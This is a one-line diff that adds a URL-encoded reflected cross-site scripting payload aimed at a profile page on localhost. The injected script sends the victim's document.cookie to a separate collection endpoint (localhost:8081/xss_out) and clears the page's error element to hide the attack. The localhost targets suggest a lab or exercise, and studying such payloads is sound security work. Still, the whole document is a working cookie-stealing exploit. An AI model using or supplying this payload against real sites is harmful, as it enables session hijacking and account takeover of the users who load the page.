@@ -1,0 +1,1 @@
+http://localhost:8080/profile/victim%3Cscript%3Eimg%20%3D%20new%20Image()%3B%20img.src%20%3D%22http%3A%2F%2Flocalhost%3A8081%2Fxss_out%3Fstolen_cookie%3D%22%2Bdocument.cookie%3B%20document.getElementsByClassName(%22error%22)[0].innerHTML%3D%22%22%20%3C%2Fscript%3E%0A
